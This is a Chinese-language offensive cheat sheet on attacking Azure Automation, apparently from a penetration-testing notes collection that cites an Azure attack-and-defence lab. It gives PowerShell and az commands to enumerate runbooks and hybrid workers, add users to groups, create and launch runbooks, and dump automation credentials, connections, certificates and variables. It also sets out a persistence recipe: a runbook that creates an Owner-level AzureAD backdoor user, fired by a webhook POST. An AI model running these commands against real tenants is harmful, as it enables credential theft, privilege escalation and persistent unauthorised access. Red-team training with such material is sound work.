# Azure 服务 - Runbook 与自动化 (Runbook and Automation)

## Runbook

Runbook 在运行之前必须先进行 **保存 (SAVED)** 和 **发布 (PUBLISHED)**。

### 列出 Runbook

```ps1
Get-AzAutomationAccount | Get-AzAutomationRunbook
```

### 创建 Runbook

* 检查用户的自动化权限

    ```powershell
    az extension add --upgrade -n automation
    az automation account list # 如果不返回任何内容，则该用户不属于任何自动化组
    az ad signed-in-user list-owned-objects
    ```

* 将用户添加到 "Automation" 组：`Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose`
* 获取用户在自动化帐户上的角色：`Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>`。 注意：具有“参与者 (Contributor)”或更高权限的帐户可以创建并执行 Runbook。
* 列出混合辅助角色 (hybrid workers)：`Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>`
* 创建 Powershell Runbook：`Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose`
* 发布 Runbook：`Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`
* 启动 Runbook：`Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose`

## 自动化帐户 (Automation Account)

### 列出自动化帐户

Azure 自动化提供了一种自动执行在 Azure 环境中执行的重复任务的方法。

```ps1
Get-AzAutomationAccount
```

### 获取自动化凭据 (Automation Credentials)

```ps1
Get-AzAutomationAccount | Get-AzAutomationCredential
Get-AzAutomationAccount | Get-AzAutomationConnection
Get-AzAutomationAccount | Get-AzAutomationCertificate
Get-AzAutomationAccount | Get-AzAutomationVariable
```

### 通过自动化帐户实现持久化 (Persistence via Automation Accounts)

* 创建一个新的自动化帐户
    * “创建 Azure 运行方式帐户 (Create Azure Run As account)”：是 (Yes)
* 导入一个新的 Runbook，该 Runbook 会为订阅创建一个具有“所有者 (Owner)”权限的 AzureAD 用户*
    * Runbook 示例 [NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
    * 发布该 Runbook
    * 向该 Runbook 添加 Webhook
* 将 AzureAD 模块添加到自动化帐户
    * 更新 Azure 自动化模块 (Azure Automation Modules)
* 向该自动化帐户分配“用户管理员 (User Administrator)”和“订阅所有者 (Subscription Owner)”权限
* 通过发送 POST 请求触发 Webhook 以创建新用户

    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```

## 所需状态配置 (Desired State Configuration / DSC)

### 列出 DSC

```ps1
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration
```

### 导出配置

```ps1
$DSCName = ${dscToExport}
Get-AzAutomationAccount | Get-AzAutomationDscConfiguration | where {$_.name -match $DSCName} | Export-AzAutomationDscConfiguration -OutputFolder (get-location) -Debug
```

## 参考资料 (References)

* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
